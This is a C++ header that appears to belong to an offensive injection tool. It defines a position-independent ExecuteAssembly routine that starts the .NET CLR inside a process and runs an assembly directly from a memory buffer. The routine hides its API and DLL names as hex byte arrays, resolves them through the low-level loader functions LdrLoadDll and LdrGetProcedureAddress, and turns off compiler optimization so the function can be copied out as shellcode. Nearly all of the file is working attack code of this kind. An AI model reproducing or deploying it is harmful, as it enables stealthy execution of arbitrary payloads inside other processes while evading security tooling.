#pragma once

#include <windows.h>
#include <windef.h>
#include <metahost.h>
#include <WinDef.h>
#include <Winternl.h>

#include <mscoree.h>
#include <metahost.h>

#import "D:\Program Files\Microsoft Visual Studio\2022\Professional\mscorlib.tlb" auto_rename
using namespace mscorlib;

#pragma optimize( "", off )


__forceinline void f_memcpy(char* dst, const char* src, size_t size)
{
	const char* psrc;
	char* pdst;
	psrc = src + size - 1;
	pdst = dst + size - 1;
	while (size--) {
		*pdst-- = *psrc--;
	}
}
__forceinline void f_memset(char* ptr, int v, size_t len)
{
	for (int i = 0; i < len; i++)
	{
		*(PBYTE)(ptr + i) = v;
	}
}


typedef NTSTATUS(WINAPI* LdrGetProcedureAddressT)(IN PVOID DllHandle, IN PANSI_STRING ProcedureName OPTIONAL, IN ULONG ProcedureNumber OPTIONAL, OUT FARPROC* ProcedureAddress);
typedef VOID(WINAPI* RtlFreeUnicodeStringT)(_Inout_ PUNICODE_STRING UnicodeString);
typedef VOID(WINAPI* RtlInitAnsiStringT)(_Out_    PANSI_STRING DestinationString, _In_opt_ PCSZ         SourceString);
typedef VOID(WINAPI* RtlInitUnicodeStringT)(_Out_    PUNICODE_STRING DestinationString, _In_opt_ PCWSTR         SourceString);
typedef VOID(WINAPI* RtlFreeAnsiStringT)(PANSI_STRING AnsiString);

typedef NTSTATUS(WINAPI* RtlAnsiStringToUnicodeStringT)(_Inout_ PUNICODE_STRING DestinationString, _In_ PCANSI_STRING SourceString, _In_ BOOLEAN AllocateDestinationString);
typedef NTSTATUS(WINAPI* LdrLoadDllT)(PWCHAR, PULONG, PUNICODE_STRING, PHANDLE);
typedef BOOL(APIENTRY* ProcDllMain)(LPVOID, DWORD, LPVOID);
typedef NTSTATUS(WINAPI* NtAllocateVirtualMemoryT)(IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN ULONG ZeroBits, IN OUT PSIZE_T RegionSize, IN ULONG AllocationType, IN ULONG Protect);

typedef HRESULT(WINAPI* FCLRCreateInstance)(REFCLSID clsid, REFIID riid, LPVOID* ppInterface);
typedef SAFEARRAY*(WINAPI* FSafeArrayCreate)(_In_ VARTYPE vt, _In_ UINT cDims, _In_ SAFEARRAYBOUND* rgsabound);
typedef HRESULT(WINAPI* FSafeArrayAccessData)(_In_ SAFEARRAY* psa, _Outptr_result_buffer_(_Inexpressible_(psa->cbElements* product(psa->rgsabound[0..psa->cDims - 1]->cElements))) void HUGEP** ppvData);
typedef HRESULT(WINAPI* FSafeArrayUnaccessData)(_In_ SAFEARRAY* psa);
typedef SAFEARRAY*(WINAPI* FSafeArrayCreateVector)(_In_ VARTYPE vt, _In_ LONG lLbound, _In_ ULONG cElements);
typedef BSTR(WINAPI* FSysAllocString)(_In_opt_z_ const OLECHAR* psz);
typedef HRESULT(WINAPI* FSafeArrayPutElement)(_In_ SAFEARRAY* psa, _In_reads_(_Inexpressible_(psa->cDims)) LONG* rgIndices, _In_ void* pv);
typedef void (WINAPI* FSysFreeString)(_In_opt_ BSTR bstrString);

struct PARAMX
{
	PVOID lpFileData;
	DWORD DataLength;
	WCHAR szArgument[512];
	LdrGetProcedureAddressT LdrGetProcedureAddress;
	NtAllocateVirtualMemoryT NtAllocateVirtualMemory;
	LdrLoadDllT LdrLoadDll;
	RtlInitUnicodeStringT RtlInitUnicodeString;
	RtlInitAnsiStringT RtlInitAnsiString;
	RtlFreeAnsiStringT RtlFreeAnsiString;
	RtlAnsiStringToUnicodeStringT RtlAnsiStringToUnicodeString;
	RtlFreeUnicodeStringT RtlFreeUnicodeString;
};

int WINAPI ExecuteAssembly(PARAMX* Param)
{
	HRESULT hr;

	ICLRMetaHost* pMetaHost = NULL;
	ICLRRuntimeInfo* pRuntimeInfo = NULL;
	BOOL bLoadable;
	ICorRuntimeHost* pRuntimeHost;
	SAFEARRAYBOUND rgsabound[1];
	VARIANT retVal;
	VARIANT obj;
	SAFEARRAY* psaStaticMethodArgs;
	VARIANT vtPsa;

	HANDLE hDll = 0;
	UNICODE_STRING UnicodeString;
	ANSI_STRING AnsiString;

	IUnknown* pAppDomainThunk;
	//intptr_t pDefaultAppDomain;
	_AppDomain* pDefaultAppDomain;
	_Assembly* pAssembly;
	_MethodInfo* pMethodInfo;



	FSafeArrayCreate pSafeArrayCreate;
	FSafeArrayAccessData pSafeArrayAccessData;
	FSafeArrayUnaccessData pSafeArrayUnaccessData;
	FSafeArrayCreateVector pSafeArrayCreateVector;
	FSysAllocString pSysAllocString;
	FSafeArrayPutElement pSafeArrayPutElement;
	FSysFreeString pSysFreeString;
	//Oleaut32.dll
	const WCHAR szOleaut32_dll[] = { 0x004F,0x006C,0x0065,0x0061,0x0075,0x0074,0x0033,0x0032,0x002E,0x0064,0x006C,0x006C,0x0000 };
	Param->RtlInitUnicodeString(&UnicodeString, szOleaut32_dll);
	Param->LdrLoadDll(NULL, NULL, &UnicodeString, &hDll);


	//SafeArrayCreate
	const CHAR szSafeArrayCreate[] = { 0x53,0x61,0x66,0x65,0x41,0x72,0x72,0x61,0x79,0x43,0x72,0x65,0x61,0x74,0x65,0x00 };
	Param->RtlInitAnsiString(&AnsiString, szSafeArrayCreate);
	Param->LdrGetProcedureAddress(hDll, &AnsiString, 0, (FARPROC*)&pSafeArrayCreate);


	//SafeArrayAccessData
	const CHAR szSafeArrayAccessData[] = { 0x53,0x61,0x66,0x65,0x41,0x72,0x72,0x61,0x79,0x41,0x63,0x63,0x65,0x73,0x73,0x44,0x61,0x74,0x61,0x00 };
	Param->RtlInitAnsiString(&AnsiString, szSafeArrayAccessData);
	Param->LdrGetProcedureAddress(hDll, &AnsiString, 0, (FARPROC*)&pSafeArrayAccessData);


	//SafeArrayUnaccessData
	const CHAR szSafeArrayUnaccessData[] = { 0x53,0x61,0x66,0x65,0x41,0x72,0x72,0x61,0x79,0x55,0x6E,0x61,0x63,0x63,0x65,0x73,0x73,0x44,0x61,0x74,0x61,0x00 };
	Param->RtlInitAnsiString(&AnsiString, szSafeArrayUnaccessData);
	Param->LdrGetProcedureAddress(hDll, &AnsiString, 0, (FARPROC*)&pSafeArrayUnaccessData);


	//SafeArrayCreateVector
	const CHAR szSafeArrayCreateVector[] = { 0x53,0x61,0x66,0x65,0x41,0x72,0x72,0x61,0x79,0x43,0x72,0x65,0x61,0x74,0x65,0x56,0x65,0x63,0x74,0x6F,0x72,0x00 };
	Param->RtlInitAnsiString(&AnsiString, szSafeArrayCreateVector);
	Param->LdrGetProcedureAddress(hDll, &AnsiString, 0, (FARPROC*)&pSafeArrayCreateVector);


	//SysAllocString
	const CHAR szSysAllocString[] = { 0x53,0x79,0x73,0x41,0x6C,0x6C,0x6F,0x63,0x53,0x74,0x72,0x69,0x6E,0x67,0x00 };
	Param->RtlInitAnsiString(&AnsiString, szSysAllocString);
	Param->LdrGetProcedureAddress(hDll, &AnsiString, 0, (FARPROC*)&pSysAllocString);


	//SafeArrayPutElement
	const CHAR szSafeArrayPutElement[] = { 0x53,0x61,0x66,0x65,0x41,0x72,0x72,0x61,0x79,0x50,0x75,0x74,0x45,0x6C,0x65,0x6D,0x65,0x6E,0x74,0x00 };
	Param->RtlInitAnsiString(&AnsiString, szSafeArrayPutElement);
	Param->LdrGetProcedureAddress(hDll, &AnsiString, 0, (FARPROC*)&pSafeArrayPutElement);


	//SysFreeString
	const CHAR szSysFreeString[] = { 0x53,0x79,0x73,0x46,0x72,0x65,0x65,0x53,0x74,0x72,0x69,0x6E,0x67,0x00 };
	Param->RtlInitAnsiString(&AnsiString, szSysFreeString);
	Param->LdrGetProcedureAddress(hDll, &AnsiString, 0, (FARPROC*)&pSysFreeString);




	rgsabound[0].cElements = Param->DataLength;
	rgsabound[0].lLbound = 0;
	SAFEARRAY* pSafeArray = pSafeArrayCreate(VT_UI1, 1, rgsabound);
	void* pvData = NULL;
	
	hr = pSafeArrayAccessData(pSafeArray, &pvData);
	f_memcpy((char*)pvData, (char*)Param->lpFileData, Param->DataLength);
	hr = pSafeArrayUnaccessData(pSafeArray);

	//mscoree.dll
	const WCHAR szMscoree_dll[] = { 0x006D,0x0073,0x0063,0x006F,0x0072,0x0065,0x0065,0x002E,0x0064,0x006C,0x006C,0x0000 };

	FCLRCreateInstance pCLRCreateInstance;

	Param->RtlInitUnicodeString(&UnicodeString, szMscoree_dll);
	Param->LdrLoadDll(NULL, NULL, &UnicodeString, &hDll);


	//CLRCreateInstance
	const CHAR szCLRCreateInstance[] = { 0x43,0x4C,0x52,0x43,0x72,0x65,0x61,0x74,0x65,0x49,0x6E,0x73,0x74,0x61,0x6E,0x63,0x65,0x00 };
	Param->RtlInitAnsiString(&AnsiString, szCLRCreateInstance);
	Param->LdrGetProcedureAddress(hDll, &AnsiString, 0, (FARPROC*)&pCLRCreateInstance);


	GUID _CLSID_CLRMetaHost = { 0x9280188d, 0xe8e,  0x4867, { 0xb3, 0xc,  0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde } };
	GUID _IID_ICLRMetaHost = { 0xd332db9e, 0xb9b3,0x4125, {0x82,0x07,0xa1,0x48,0x84,0xf5,0x32,0x16 } };
	hr = pCLRCreateInstance(_CLSID_CLRMetaHost, _IID_ICLRMetaHost, (VOID**)&pMetaHost);

	//v4.0.30319
	const WCHAR szv4_0_30319[] = { 0x0076,0x0034,0x002E,0x0030,0x002E,0x0033,0x0030,0x0033,0x0031,0x0039,0x0000 };
	GUID _IID_ICLRRuntimeInfo = { 0xbd39d1d2, 0xba2f,  0x486a, { 0x89,0xb0,0xb4,0xb0,0xcb,0x46,0x68,0x91 } };
	hr = pMetaHost->GetRuntime(szv4_0_30319, _IID_ICLRRuntimeInfo, (VOID**)&pRuntimeInfo);
	if (FAILED(hr)) return -1;

	hr = pRuntimeInfo->IsLoadable(&bLoadable);

	if (FAILED(hr) || !bLoadable)
	{
		return -1;
	}
	GUID _CLSID_CorRuntimeHost = { 0xcb2f6723, 0xab3a, 0x11d2, {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e} };
	GUID _IID_ICorRuntimeHost = { 0xcb2f6722, 0xab3a, 0x11d2, {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e} };
	hr = pRuntimeInfo->GetInterface(_CLSID_CorRuntimeHost, _IID_ICorRuntimeHost, (VOID**)&pRuntimeHost);
	if (FAILED(hr)) return -1;

	hr = pRuntimeHost->Start();
	if (FAILED(hr)) return -1;

	hr = pRuntimeHost->GetDefaultDomain(&pAppDomainThunk);
	if (FAILED(hr)) return -1;

	//05f696dc_2b29_3663_ad8b_c4389cf2a713
	GUID _IID_AppDomain = { 0x05f696dc, 0x2b29, 0x3663, {0xad,0x8b,0xc4,0x38,0x9c,0xf2,0xa7,0x13} };
	hr = pAppDomainThunk->QueryInterface(_IID_AppDomain, (VOID**)&pDefaultAppDomain);
	if (FAILED(hr)) return -1;

	hr = pDefaultAppDomain->raw_Load_3(pSafeArray,&pAssembly);
	if (FAILED(hr)) return -1;
	
	

	hr = pAssembly->get_EntryPoint(&pMethodInfo);
	if (FAILED(hr)) return -1;

	f_memset((char*)&retVal,0, sizeof(VARIANT));
	f_memset((char*)&obj,0, sizeof(VARIANT));


	//返回值void， 参数是String 的函数
	obj.vt = VT_NULL;
	vtPsa.vt = (VT_ARRAY | VT_BSTR);

	psaStaticMethodArgs = pSafeArrayCreateVector(VT_VARIANT, 0, 1);
	vtPsa.parray = pSafeArrayCreateVector(VT_BSTR, 0, 1);
	long index = 0;
	BSTR strParam1 = pSysAllocString(Param->szArgument);
	hr = pSafeArrayPutElement(vtPsa.parray, &index, strParam1);
	if (FAILED(hr)) return -1;


	long iEventCdIdx(0);
	hr = pSafeArrayPutElement(psaStaticMethodArgs, &iEventCdIdx, &vtPsa);
	if (FAILED(hr)) return -1;

	//Assembly execution
	hr = pMethodInfo->raw_Invoke_3(obj, psaStaticMethodArgs,&retVal);

	pSysFreeString(strParam1);

    return 0;
};


FunctionEndFlag(ExecuteAssembly)

#pragma optimize( "", on )


